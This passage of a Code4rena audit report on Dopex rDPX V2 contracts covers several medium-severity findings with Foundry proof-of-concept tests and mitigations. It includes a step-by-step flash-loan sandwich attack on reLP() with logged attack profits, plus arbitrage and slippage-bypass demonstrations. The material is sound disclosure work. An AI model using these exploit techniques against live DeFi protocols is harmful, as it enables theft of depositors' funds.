```

As can be seen, the `discountReceivedInWeth`, which is an amount of ETH, will then be converted into an equivalent amount of rDPX (`extraRdpxToWithdraw`), and then this amount of rDPX is withdrawn to serve as the collateral for the minted rDPX.

The issue with this is the following call to `_stake` within the flow of the `bond` function, which has the following line of code:

```solidity
reserveAsset[reservesIndex["WETH"]].tokenBalance -= _amount / 2;
```

Essentially, irrespective of the actual amount of ETH which has been deposited by the user, for the specified `_amount` of dpxETH to mint, `_amount / 2` of ETH will be taken from the token reserves of the RdpxV2Core contract. This means that as more and more ETH discounts are given, this ETH amount will be drained to zero. At this point, future calls to `bond` will revert.

### Recommended Mitigation Steps

The discount on the WETH portion during minting should be provided in WETH rather than in an equivalent amount of rDPX.

**[psytama (Dopex) confirmed](https://github.com/code-423n4/2023-08-dopex-findings/issues/2210#issuecomment-1734323260)**

***

## [[M-02] The vault allows "free" swaps from WETH to RDPX](https://github.com/code-423n4/2023-08-dopex-findings/issues/2130)
*Submitted by [LokiThe5th](https://github.com/code-423n4/2023-08-dopex-findings/issues/2130), also found by [Evo](https://github.com/code-423n4/2023-08-dopex-findings/issues/1643), [0xnev](https://github.com/code-423n4/2023-08-dopex-findings/issues/626), and [volodya](https://github.com/code-423n4/2023-08-dopex-findings/issues/357)*

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L145-L175> 

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118-L135> 

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L227>

The `PerpetualAtlanticVaultLP` allows users to `deposit()` `WETH` into the vault and receive shares in return. If a user calls `redeem` on the vault, they receive a proportional amount of `WETH` and `rdpx` in return for burning their shares.

This can be used as a way to swap from `WETH` to `rdpx` without needing to pay swap fees to the V2 Permissioned AMM that is being introduced in V2. Swapping in this way may allow users to receive `rdpx` at a discount.

`PerpetualAtlanticVaultLP` mints shares to a depositor by taking into account the current price of `rdpx` and using it to calculate the total underlying asset value. The root cause of the issue is that when calculating the amount of `rdpx` to return on `redeem`, the calculation does not use the current price, but uses: `shares.mulDivDown(_rdpxCollateral, supply)`.

The practical effect being that of a swap of in proportions determined by the initial deposit price. This means that the vault itself may experience arbitrage, as the amount of `rdpx` returned is determined by it's proportion in the vault at that moment, not by it's current market value.

This has been evaluated to medium as the vault's depositors lose this value and the AMM loses out on swap fees.

### Proof of Concept

Assumptions:

*   there is rdpx in the `PerpetualAtlanticVaultLP` (i.e. puts have been settled)

The PoC should be copied into the `perp-vault/Integration.t.sol` file and then can be run with `forge test --match-test testPoCMedium1 -vvv`

The line where the PoC starts is clearly marked. The PoC shows how the amount of `rdpx` returned from `deposit` and the immediate `redeem` is not affected by changes to the price once a deposit has been made, but is affected by the amount of underlying `rdpx`.

This means that doing this type of "swap" may present arbitrage opportunities at the expense of depositors.

<details>

      function testPoCMedium1() external {
        // Setup starts here ----------------------------->
        setApprovals(address(1));
        setApprovals(address(2));
        setApprovals(address(3));

        mintWeth(5 ether, address(1));
        mintWeth(5 ether, address(2));
        mintWeth(25 ether, address(3));
        mintWeth(1 ether, address(4));

        /// The users deposit
        deposit(5 ether, address(1));
        deposit(5 ether, address(2));
        deposit(25 ether, address(3));

        // premium = 100 * 0.05 weth = 5 weth
        uint256 tokenId = purchase(100 ether, address(this)); // 0.015 gwei * 100 ether / 0.1 gwei = 15 ether collateral activated

        skip(86500); // expires epoch 1
        vault.updateFunding();
        vault.updateFundingPaymentPointer();
        uint256[] memory strikes = new uint256[](1);
        strikes[0] = 0.015 gwei;
        uint256 fundingAccrued = vault.calculateFunding(strikes);
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;

        // The market moves against `rdpx` and the puts are now in the money
        priceOracle.updateRdpxPrice(0.010 gwei);

        vm.startPrank(address(this), address(this));
        (uint256 ethAmount, uint256 rdpxAmount) = vault.settle(tokenIds);
        vm.stopPrank();

        /// ---------------- POC STARTS HERE -------------------------------------------------///
        // The user intending to swap deposits 1 WETH into the `VaultLP`
        vm.startPrank(address(4));
        weth.approve(address(vaultLp), 1 ether);
        uint256 userShares = vaultLp.deposit(1 ether, address(4));
        vm.stopPrank();

        // For the POC we get a quote at the current price of 0.010 gwei of WETH per rdpx

        console.log("Deposit swap from WETH to RDPX - Part 1");
        console.log("Current rdpxPriceInEth: ", vault.getUnderlyingPrice());
        console.log("User gets:");
        uint256 userBalance = vaultLp.balanceOf(address(4));
        (uint256 wethUser, uint256 rdpxUser) = vaultLp.redeemPreview(userBalance);
        console.log("WETH: ", wethUser);
        console.log("rdpx: ", rdpxUser);

        console.log("");
        // For the POC we get another quote at the current price of 0.010 gwei of WETH per rdpx
        console.log("Deposit swap from WETH to RDPX - Part 2");
        priceOracle.updateRdpxPrice(0.020 gwei);
        console.log("Current rdpxPriceInEth: ", vault.getUnderlyingPrice());
        console.log("User gets:");
        (uint256 wethUserPart2, uint256 rdpxUserPart2) = vaultLp.redeemPreview(userBalance);
        console.log("WETH: ", wethUserPart2);
        console.log("rdpx: ", rdpxUserPart2);

        // We assert that the user still gets the same amount of rdpx regardless of the price
        assertEq(rdpxUser, rdpxUserPart2);

        // We change the `_rdpxCollateral`
        mintRdpx(10 ether, address(vault));
        vm.startPrank(address(vault));
        rdpx.transfer(address(vaultLp), 10 ether);
        vaultLp.addRdpx(10 ether);
        vm.stopPrank();

        // Now we test that the amount of `rdpx` returned changes in response to more underlying `rdpx` received
        console.log("");
        console.log("Deposit swap from WETH to RDPX - Part 3");
        priceOracle.updateRdpxPrice(0.020 gwei);
        console.log("Current rdpxPriceInEth: ", vault.getUnderlyingPrice());
        console.log("User gets:");
        (uint256 wethUserPart3, uint256 rdpxUserPart3) = vaultLp.redeemPreview(userBalance);
        console.log("WETH: ", wethUserPart3);
        console.log("rdpx: ", rdpxUserPart3);

        // We assert that we will receive more `rdpx` for the same amount of `WETH`
        assertGt(rdpxUserPart3, rdpxUserPart2);
        assertEq(wethUserPart3, wethUserPart2);
      }

</details>

### Tools Used

Foundry

### Recommended Mitigation Steps

When calling `redeem`, calculate the amount of `rdpx` the depositor should receive using up-to-date `rdpxPriceInEth`.

Consider disallowing immediate `deposit` and `redeem` calls through some mechanism.

**[psytama (Dopex) acknowledged](https://github.com/code-423n4/2023-08-dopex-findings/issues/2130#issuecomment-1734336355)**

***

## [[M-03] No mechanism to settle out-of-money put options even after Bond receipt token is redeemed. ](https://github.com/code-423n4/2023-08-dopex-findings/issues/1956)
*Submitted by [0Kage](https://github.com/code-423n4/2023-08-dopex-findings/issues/1956), also found by [peakbolt](https://github.com/code-423n4/2023-08-dopex-findings/issues/1479), [pep7siup](https://github.com/code-423n4/2023-08-dopex-findings/issues/1100), [ABA](https://github.com/code-423n4/2023-08-dopex-findings/issues/1068), [0xnev](https://github.com/code-423n4/2023-08-dopex-findings/issues/625), and [zzebra83](https://github.com/code-423n4/2023-08-dopex-findings/issues/419)*

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L333> 

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L800> 

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L376>

In the current implementation of `PerpetualAtlanticVault::settle`, the only way an `optionId` can be burnt is when the option is in-the-money. Note that at the time of bonding, a put option that is 25% out of the money is purchased by user. If the RDPX-ETH price is above this price, the option is rolled over to the next epoch and a new premium is again calculated inside the `PerpetualAtlanticVault::calculateFunding` and added to the `totalFundingForEpoch`.

Effectively, as long as the option is out of money, the funding cost continues to be deducted from core contract and passed to Atlantic vault LPs.  There is no check if the underlying bond for which this put option is minted is redeemed or not.

Not completely sure if this is bug or feature of Perpetual Atlantic Puts but since the utility of these puts is to protect downside price movements of RDPX during bonding, such options should be retired once the underlying bond is redeemed by user. Paying out a premium on a perennial basis to Atlantic LP's does not make sense.

### Impact

There are 2 implications:

1.  Atlantic vault LPs collateral will be locked so long as option is out of money. This is because `optionStrikes[strike]` never reduces so long as the option continues to be OTM.
2.  Core contract continues to pay out funding costs for OTM options that cannot be settled.

### Recommended Mitigation Steps

Consider settling `optionIds` that no longer have an underlying bonding. Put options for such bonds should expire and free up locked collateral in Atlantic Vaults.

**[psytama (Dopex) confirmed](https://github.com/code-423n4/2023-08-dopex-findings/issues/1956#issuecomment-1734300784)**

***

## [[M-04] reLP() mintokenAAmount the calculations are wrong](https://github.com/code-423n4/2023-08-dopex-findings/issues/1805)
*Submitted by [bin2chen](https://github.com/code-423n4/2023-08-dopex-findings/issues/1805), also found by [Toshii](https://github.com/code-423n4/2023-08-dopex-findings/issues/2097), [QiuhaoLi](https://github.com/code-423n4/2023-08-dopex-findings/issues/1847), [sces60107](https://github.com/code-423n4/2023-08-dopex-findings/issues/1405), [0Kage](https://github.com/code-423n4/2023-08-dopex-findings/issues/1400), [flacko](https://github.com/code-423n4/2023-08-dopex-findings/issues/1371), [ubermensch](https://github.com/code-423n4/2023-08-dopex-findings/issues/1287), [ether\_sky](https://github.com/code-423n4/2023-08-dopex-findings/issues/1238), [qpzm](https://github.com/code-423n4/2023-08-dopex-findings/issues/1231), [kutugu](https://github.com/code-423n4/2023-08-dopex-findings/issues/1117), [pep7siup](https://github.com/code-423n4/2023-08-dopex-findings/issues/1093), [gjaldon](https://github.com/code-423n4/2023-08-dopex-findings/issues/1046), [carrotsmuggler](https://github.com/code-423n4/2023-08-dopex-findings/issues/1014), [mert\_eren](https://github.com/code-423n4/2023-08-dopex-findings/issues/965), [said](https://github.com/code-423n4/2023-08-dopex-findings/issues/916), [0xDING99YA](https://github.com/code-423n4/2023-08-dopex-findings/issues/813), [tapir](https://github.com/code-423n4/2023-08-dopex-findings/issues/451), [Yanchuan](https://github.com/code-423n4/2023-08-dopex-findings/issues/285), and [deadrxsezzz](https://github.com/code-423n4/2023-08-dopex-findings/issues/135)*

in `reLP()` , Calculating ` mintokenAAmount  ` using the wrong formula can invalidate the slippage protection

### Proof of Concept

`ReLPContract.reLP()`The implementation is as follows:

```solidity
  function reLP(uint256 _amount) external onlyRole(RDPXV2CORE_ROLE) {
...

@>  mintokenAAmount =
@>    (((amountB / 2) * tokenAInfo.tokenAPrice) / 1e8) -
@>    (((amountB / 2) * tokenAInfo.tokenAPrice * slippageTolerance) / 1e16);

    uint256 tokenAAmountOut = IUniswapV2Router(addresses.ammRouter)
      .swapExactTokensForTokens(
        amountB / 2,
        mintokenAAmount,
        path,
        address(this),
        block.timestamp + 10
      )[path.length - 1];

    (, , uint256 lp) = IUniswapV2Router(addresses.ammRouter).addLiquidity(
      addresses.tokenA,
      addresses.tokenB,
      tokenAAmountOut,
      amountB / 2,
      0,
      0,
      address(this),
      block.timestamp + 10
    );

    // transfer the lp to the amo
    IERC20WithBurn(addresses.pair).safeTransfer(addresses.amo, lp);
    IUniV2LiquidityAmo(addresses.amo).sync();

    // transfer rdpx to rdpxV2Core
    IERC20WithBurn(addresses.tokenA).safeTransfer(
      addresses.rdpxV2Core,
      IERC20WithBurn(addresses.tokenA).balanceOf(address(this))
    );
    IRdpxV2Core(addresses.rdpxV2Core).sync();
  }

```

The formula for calculating `mintokenAAmount` in the above code is
`((amountB / 2) * tokenAInfo.tokenAPrice) / 1e8`

`amountB` is the amount of tokenB, but `tokenAInfo.tokenAPrice` is the price of tokenA, which shouldn't be multiplied together

The correct one should be

`((amountB / 2) * 1e8 / tokenAInfo.tokenAPrice)`

### Recommended Mitigation Steps

```diff
  function reLP(uint256 _amount) external onlyRole(RDPXV2CORE_ROLE) {
...

-    mintokenAAmount =
-     (((amountB / 2) * tokenAInfo.tokenAPrice) / 1e8) -
-     (((amountB / 2) * tokenAInfo.tokenAPrice * slippageTolerance) / 1e16);

+    mintokenAAmount =  ((amountB / 2) * 1e8 / tokenAInfo.tokenAPrice) * (1e8 - slippageTolerance) / 1e8;

    uint256 tokenAAmountOut = IUniswapV2Router(addresses.ammRouter)
      .swapExactTokensForTokens(
        amountB / 2,
        mintokenAAmount,
        path,
        address(this),
        block.timestamp + 10
      )[path.length - 1];

    (, , uint256 lp) = IUniswapV2Router(addresses.ammRouter).addLiquidity(
      addresses.tokenA,
      addresses.tokenB,
      tokenAAmountOut,
      amountB / 2,
      0,
      0,
      address(this),
      block.timestamp + 10
    );

    // transfer the lp to the amo
    IERC20WithBurn(addresses.pair).safeTransfer(addresses.amo, lp);
    IUniV2LiquidityAmo(addresses.amo).sync();

    // transfer rdpx to rdpxV2Core
    IERC20WithBurn(addresses.tokenA).safeTransfer(
      addresses.rdpxV2Core,
      IERC20WithBurn(addresses.tokenA).balanceOf(address(this))
    );
    IRdpxV2Core(addresses.rdpxV2Core).sync();
  }

```

**[psytama (Dopex) confirmed](https://github.com/code-423n4/2023-08-dopex-findings/issues/1805#issuecomment-1734296343)**

***

## [[M-05] \_curveSwap: getDpxEthPrice and getEthPrice is in wrong order](https://github.com/code-423n4/2023-08-dopex-findings/issues/1558)
*Submitted by [QiuhaoLi](https://github.com/code-423n4/2023-08-dopex-findings/issues/1558), also found by [0xvj](https://github.com/code-423n4/2023-08-dopex-findings/issues/2164), [Toshii](https://github.com/code-423n4/2023-08-dopex-findings/issues/2096), [bin2chen](https://github.com/code-423n4/2023-08-dopex-findings/issues/1802), [Udsen](https://github.com/code-423n4/2023-08-dopex-findings/issues/1613), [sces60107](https://github.com/code-423n4/2023-08-dopex-findings/issues/1399), [carrotsmuggler](https://github.com/code-423n4/2023-08-dopex-findings/issues/1023), [bart1e](https://github.com/code-423n4/2023-08-dopex-findings/issues/970), [said](https://github.com/code-423n4/2023-08-dopex-findings/issues/854), [T1MOH](https://github.com/code-423n4/2023-08-dopex-findings/issues/786), [0xDING99YA](https://github.com/code-423n4/2023-08-dopex-findings/issues/608), [SBSecurity](https://github.com/code-423n4/2023-08-dopex-findings/issues/602), [wintermute](https://github.com/code-423n4/2023-08-dopex-findings/issues/1827), and [pep7siup](https://github.com/code-423n4/2023-08-dopex-findings/issues/1416)*

When `_curveSwap` is called with `minAmount = 0` (upperDepeg/lowerDepeg use the default slippage 0.5%), the `minOut` will be a wrong value which leads to slippage protect failure.

### Proof of Concept

In `_curveSwap`, the getDpxEthPrice and getEthPrice is in wrong order:

```solidity
    uint256 minOut = _ethToDpxEth
      ? (((_amount * getDpxEthPrice()) / 1e8) -
        (((_amount * getDpxEthPrice()) * slippageTolerance) / 1e16))
      : (((_amount * getEthPrice()) / 1e8) -
        (((_amount * getEthPrice()) * slippageTolerance) / 1e16));
```

When `_ethToDpxEth` is true, we swap eth for dpxeth. However, we use getDpxEthPrice, which is dpxeth's price in eth (dpxeth/eth). Also, when we swap dpxeth for eth, we use getEthPrice which is eth's price in dpxeth.

Below is a PoC that demonstrates we get the wrong slippage when calling `upperDepeg` with default slippage tolerance:

```solidity
// add this to _curveSwap
    amountOut = dpxEthCurvePool.exchange(
      _ethToDpxEth ? int128(int256(a)) : int128(int256(b)),
      _ethToDpxEth ? int128(int256(b)) : int128(int256(a)),
      _amount,
      minAmount > 0 ? minAmount : minOut
    );
    if (!_ethToDpxEth) {
      console.log("getDpxEthPrice = %s > 1e8, swap %s dpxEth for Eth (0.5% slippage):", getDpxEthPrice(), _amount);
      console.log("minOut (wrong slippage) = \t%s", minOut);
      uint256 ideal_Out = (_amount * getDpxEthPrice()) / 1e8;
      uint256 correct_minOut = (ideal_Out - (((_amount * getDpxEthPrice()) * slippageTolerance) / 1e16));
      console.log("minOut (correct slippage) = \t%s", correct_minOut);
      console.log("Actual got Eth amountOut = \t%s", amountOut);
      console.log("Actual slippage = \t\t%s% > 0.5%", (ideal_Out - amountOut)*1e2/ideal_Out);
    }
```

    // tests/rdpxV2-core/Unit.t.sol
    function testUpperDepeg_default_slippageTolerance() public {
        // swap weth for dpxETH (price after swap 180000000)
        dpxETH.approve(address(curvePool), 200 * 1e18);
        address coin0 = IStableSwap(curvePool).coins(0);
        if (coin0 == address(weth)) {
          IStableSwap(curvePool).exchange(0, 1, 200 * 1e18, 0);
        } else {
          IStableSwap(curvePool).exchange(1, 0, 200 * 1e18, 0);
        }
        // dpxEth : Eth = 1.8 : 1
        dpxEthPriceOracle.updateDpxEthPrice(180000000);

        // mint dpxEth and swap for Eth, using default slippage (0.5%)
        rdpxV2Core.upperDepeg(10e18, 0);
    }

Output:

```
$ forge test -vv --match-test "testUpperDepeg_default_slippageTolerance"
Running 1 test for tests/rdpxV2-core/Unit.t.sol:Unit
[PASS] testUpperDepeg_default_slippageTolerance() (gas: 246264)
Logs:
  getDpxEthPrice = 180000000 > 1e8, swap 10000000000000000000 dpxEth for Eth (0.5% slippage):
  minOut (wrong slippage) =     5527777722500000000
  minOut (correct slippage) =   17910000000000000000
  Actual got Eth amountOut =    15885460869832720611
  Actual slippage =             11% > 0.5%

```

### Recommended Mitigation Steps

Reverse the order:

```solidity
    uint256 minOut = _ethToDpxEth
      ? (((_amount * getEthPrice()) / 1e8) -
        (((_amount * getEthPrice) * slippageTolerance) / 1e16))
      : (((_amount * getDpxEthPrice()) / 1e8) -
        (((_amount * getDpxEthPrice()) * slippageTolerance) / 1e16));
```

**[psytama (Dopex) confirmed via duplicate issue 970](https://github.com/code-423n4/2023-08-dopex-findings/issues/970)**

***

## [[M-06] Missing slippage parameter on Uniswap `addLiquidity()` function](https://github.com/code-423n4/2023-08-dopex-findings/issues/1032)
*Submitted by [juancito](https://github.com/code-423n4/2023-08-dopex-findings/issues/1032), also found by [KrisApostolov](https://github.com/code-423n4/2023-08-dopex-findings/issues/2179), [nemveer](https://github.com/code-423n4/2023-08-dopex-findings/issues/1686), [RED-LOTUS-REACH](https://github.com/code-423n4/2023-08-dopex-findings/issues/1542), [0xmuxyz](https://github.com/code-423n4/2023-08-dopex-findings/issues/1380), [ciphermarco](https://github.com/code-423n4/2023-08-dopex-findings/issues/1259), [ladboy233](https://github.com/code-423n4/2023-08-dopex-findings/issues/1135), [Bauchibred](https://github.com/code-423n4/2023-08-dopex-findings/issues/986), [Viktor\_Cortess](https://github.com/code-423n4/2023-08-dopex-findings/issues/679), [0xnev](https://github.com/code-423n4/2023-08-dopex-findings/issues/633), [ArmedGoose](https://github.com/code-423n4/2023-08-dopex-findings/issues/587), [0x3b](https://github.com/code-423n4/2023-08-dopex-findings/issues/71), [ginlee](https://github.com/code-423n4/2023-08-dopex-findings/issues/223), and [mitko1111](https://github.com/code-423n4/2023-08-dopex-findings/issues/1983)*

The Uniswap `addLiquidity()` function expects the slippage params `amountAMin`, and `amountBMin` to be passed.

The `reLP()` sets those values as `0`, which in other terms, means that the contract is ok with receiveing less amount of tokens than the fair market price when providing liquidity.

### Impact

Less LP tokens will be received during the `reLP()` call, as it will accept any amount of tokens while adding liquidity to Uniswap.

### Proof of Concept

The `reLP()` is used by the bond functions, and uses `0` for the `amountAMin`, and `amountBMin` values passed to the `addLiquidity()` function on the Uniswap router:

```solidity
    (, , uint256 lp) = IUniswapV2Router(addresses.ammRouter).addLiquidity(
      addresses.tokenA,
      addresses.tokenB,
      tokenAAmountOut,
      amountB / 2,
      0,                    // @audit
      0,                    // @audit
      address(this),
      block.timestamp + 10
    );
```

*   [ReLPContract.sol#L286-L295](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/reLP/ReLPContract.sol#L286-L295)
*   [addLiquidity() on Uniswap](https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#addliquidity)

This will make the function return less lp tokens than expected, while rebalancing.

### Recommended Mitigation Steps

Set the `amountAMin` and `amountBMin` parameters to the expected minimum values.

**[psytama (Dopex) confirmed](https://github.com/code-423n4/2023-08-dopex-findings/issues/1032#issuecomment-1734120992)**


***

## [[M-07] The owner of RPDX Decaying Bonds is not updated on token transfers](https://github.com/code-423n4/2023-08-dopex-findings/issues/1030)
*Submitted by [juancito](https://github.com/code-423n4/2023-08-dopex-findings/issues/1030), also found by [glcanvas](https://github.com/code-423n4/2023-08-dopex-findings/issues/1349), [Yanchuan](https://github.com/code-423n4/2023-08-dopex-findings/issues/1138), and [volodya](https://github.com/code-423n4/2023-08-dopex-findings/issues/532)*

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/decaying-bonds/RdpxDecayingBonds.sol#L36-L44> 

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/decaying-bonds/RdpxDecayingBonds.sol#L122>

The `RdpxDecayingBonds` contract keeps track of a `bonds` mapping with bonds information including the bond token owner. When the token is transfered, the `bonds[bondId].owner` value should be updated, but it isn't.

### Impact

The `owner` value will be bricked when a token is transfered, as it can't be changed by any means.

Any integration relying on this value will make wrong trusted assumptions related to the bond token owner, potentially leading to critical issues as loss of funds, because of the importance of the `owner` attribute has.

Ranking it as Medium, as there is no direct loss of funds within the current scope, but bricks the contract functionality, as there is no way to fix it.

### Proof of Concept

The `owner` attribute of the `bonds` mapping is set on each `mint()`, but its value is never updated:

```solidity
  // Array of bonds
  mapping(uint256 => Bond) public bonds;

  // Structure to store the bond information
  struct Bond {
    address owner; // @audit
    uint256 expiry;
    uint256 rdpxAmount;
  }
```

[RdpxDecayingBonds.sol#L36-L44](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/decaying-bonds/RdpxDecayingBonds.sol#L36-L44)

```solidity
  function mint(
    address to,
    uint256 expiry,
    uint256 rdpxAmount
  ) external onlyRole(MINTER_ROLE) {
    _whenNotPaused();
    require(hasRole(MINTER_ROLE, msg.sender), "Caller is not a minter");
    uint256 bondId = _mintToken(to);
@>  bonds[bondId] = Bond(to, expiry, rdpxAmount); // @audit

    emit BondMinted(to, bondId, expiry, rdpxAmount);
  }
```

[RdpxDecayingBonds.sol#L122](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/decaying-bonds/RdpxDecayingBonds.sol#L122)

### Coded Proof of Concept

This test shows how the `owner` remains the same on the `bonds` transfer after performing a transfer.

Add this test to the `tests/RdpxDecayingBondsTest.t.sol` file, and run `forge test --mt "testSameOwnerOnTransfer"`:

```solidity
  function testSameOwnerOnTransfer() public {
    // Mint a token
    rdpxDecayingBonds.mint(address(this), 1223322, 5e18);

    // The tokenId is 1
    // This can be confirmed by the fact that it changes its `ownerOf()` result on the OZ ERC721 after the transfer
    uint256 tokenId = 1;

    // Check the bond token owner before the transfer
    // Check for both via the `bonds` mapping, and the OZ `ownerOf()` function
    (address ownerBeforeTransfer,,) = rdpxDecayingBonds.bonds(tokenId);
    assertEq(ownerBeforeTransfer, address(this));
    assertEq(rdpxDecayingBonds.ownerOf(tokenId), address(this));

    // Transfer token
    rdpxDecayingBonds.safeTransferFrom(address(this), address(420), tokenId);

    // The `owner` changes on the OZ `ownerOf` function, while it remains the same on the `bonds` mapping
    (address ownerAfterTransfer,,) = rdpxDecayingBonds.bonds(tokenId);
    assertEq(ownerAfterTransfer, address(this));                        // @audit remains the same after the transfer
    assertEq(rdpxDecayingBonds.ownerOf(tokenId), address(420));
  }
```

### Recommended Mitigation Steps

Either update the `owner` value on each token transfer, or remove it, as the owner of the token is already tracked via the OZ ERC721 contract.

**[psytama (Dopex) confirmed](https://github.com/code-423n4/2023-08-dopex-findings/issues/1030#issuecomment-1734120024)**

**[Alex the Entreprenerd (Judge) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/1030#issuecomment-1759301770):**
 > The finding lacks a clear loss of funds, although that may be possible since `ownerOf` is used for internal checks.
>
> The code breaks the implementation of EIP721, and may also cause losses + issues with integrations.
> 
> I think Medium Severity is appropriate.

***

## [[M-08] `reLPContract.reLP()` is susceptible to sandwich attack due to user control over `bond()`](https://github.com/code-423n4/2023-08-dopex-findings/issues/976)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-08-dopex-findings/issues/976)*

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L873> 

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L930>

`RdpxV2Core.bond()` calls `reLPContract.reLP()` at the end of the bonding to adjust the LP for the rDPX/ETH pool and swap ETH for rDPX.
Within `reLPContract.reLP()`, it first calls `removeLiquidity()` to remove liquidity (rDPX and ETH), followed by `swapExactTokensForTokens()` and `addLiquidity()`.

However, the issue is that an attacker has control over `RdpxV2Core.bond()` and can use it to indirectly call `reLPContract.reLP()`. That means the attacker can basically frontrunned/backrunned `reLP()` without a mempool. It also reduces the attack cost as attacker does not pay high gas to frontrun it.

One may argue that the slippage protection is in place, but that only makes it less profitable and would not help in this case because the attacker is able to increase the trade size of the UniswapV2 transactions. That is because the attacker can adjust the bonding amount to increase the amount of liquidity removed by `reLP()` (and also swap/add liquidity), allowing the attacker to craft a profitable sandwich attack.

It is not recommended to allow users to have indirect control over the UniswapV2 transaction in `reLPContract`.

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L873>

```Solidity
  function bond(
    uint256 _amount,
    uint256 rdpxBondId,
    address _to
  ) public returns (uint256 receiptTokenAmount) {

    ...
    //@audit an attacker can indirectly trigger this to perform a large trade and sandwich attack it
    // reLP
    if (isReLPActive) IReLP(addresses.reLPContract).reLP(_amount);

```

### Impact

An attacker can steal from `rdpxV2Core` by crafting an profitable sandwich attack on `bond()`.

### Proof of Concept

An attacker can perform a sandwich attack as follows:

1.  Perform a flash loan to borrow ETH.
2.  Use the borrowed ETH to perform a ETH-to-rDPX swap on the UniswapV2 rDPX/ETH pool. This is to increase the price of rDPX before `reLPContract.reLP()`.
3.  Call `rdpxV2Core.bond()` to indirectly trigger `reLPContract.reLP()`, which will `removeLiquidity()`, causing it receive lesser rDPX due to the price manipulation.
4.  `reLPContract.reLP()` will then `swapExactTokensForTokens()` to swap ETH-to-rDPX using ETH from removed liquidity. This further increase price of rDPX.
5.  `addLiquidity()` is then called by `reLPContract.reLP()` to return part of the liquidity into the pool.
6.  Attacker now swap rDPX back to ETH to realize profit from the attack and pay back the flash loan.

### Recommended Mitigation Steps

Remove `reLPContract.ReLP()` from `bond()` and trigger separately to prevent user access to it.

**[psytama (Dopex) confirmed and commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/976#issuecomment-1733781720):**
 > The re-LP contract and process will be modified.

**[Alex the Entreprenerd (Judge) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/976#issuecomment-1759437289):**
 > I would have liked to see a Coded POC.
> 
> Removing Liquidity is not as simple to exploit as swap.

**[Alex the Entreprenerd (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/976#issuecomment-1763994630):**
 > UniV2 Code is as follows:<br>
> https://github.com/Uniswap/v2-core/blob/ee547b17853e71ed4e0101ccfd52e70d5acded58/contracts/UniswapV2Pair.sol#L144-L155
> 
> Offering Pro Rata Distribution
> 
> In lack of a coded POC
> 
> The maximum skimmable is the delta excess value in the UniV2 Reserves vs the value that the caller has to pay to imbalance them.
> 
> The cost of imbalancing and the nature of it + the fact that other people would have ownership of the LP token means that profitability is dependent on those factors, which IMO have not been properly factored in.
> 
> In the presence of a Coded POC as part of the original submission, I would have considered a High Severity.
> 
> In lack of it, Medium Severity for Skimming the excess value seems more appropriate.

**[peakbolt (Warden) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/976#issuecomment-1774193810):**
 > Hi @Alex the Entreprenerd, 
> 
> I understand your judgement as you have raised valid points, though the circumstances here are different (explained below), which make it more profitable as compared to a typical sandwich attack on removeLiquidity().
> 
> **1. Coded POC**  
> Below is the printout from the POC, which shows it is more than just skimming of excess value (profit of 42.79 ETH using 1000 ETH flash loan vs minimal cost in point 2 below). 
> For your reference, I have uploaded it [here](https://gist.github.com/peakbolt/f2d9a44714b1a2a693debea737128696).
> 
> ```
>  --------------  setup copied from testReLpContract() ------------
>   -------------- 1. attacker perform first swap to get rDPX with flashloaned WETH ------------
>   attacker weth balance (initial) : 10000000000000000000000 [from flashloan]
>   attacker rdpx balance (initial) : 0 
>   attacker weth balance (after 1st swap): 0 
>   attacker rdpx balance (after 1st swap): 33799781371440793668463
>   rDPX price in WETH (after 1st swap): 435429977934145959 
>   -------------- 2. Attacker triggers bond() that indirectly perform removeLiquidity() in reLPContract.reLP() ------------
>   rDPX price in WETH (after bond): 440827346696573406 
>   -------------- 3. Attacker performs 2nd swap rDPX back to WETH and profit ------------
>   attacker weth balance (after 2nd swap): 10042795347724107931994 
>   attacker rdpx balance (after 2nd swap): 0
>   attacker profit in WETH (after repaying flashloan): 42795347724107931994
> ```
> 
> **2. Cost of imbalancing** 
> There are 3 main attack cost implicitly mentioned in the original submission. Based on the POC, they are ~11 ETH, minimal as compared to the 42.79 ETH profit.
> - Flash loan cost - as mentioned, use of flash loan for WETH in POC. If we take Aave as a reference, flash loan fee is 0.09% of flash loan amount, which will be 9 ETH based on POC, lower than the 42.79 ETH profit.
> - Gas cost - as mentioned this attack does not involve mempool to frontrun, so attacker does not need to pay high gas fee.
> - Bonding cost - obviously rDPX and ETH are required to trigger bond(), this is negligible as it can be recouped by redeeming/selling the bonded dpxETH. If we take Aave ETH borrow cost at a conservative 2% APY for 1e20 dpxETH bonding amount, that will be 2 ETH, which is even lower than flash loan fee.
> 
> **3. Control over amount of LP tokens to remove** 
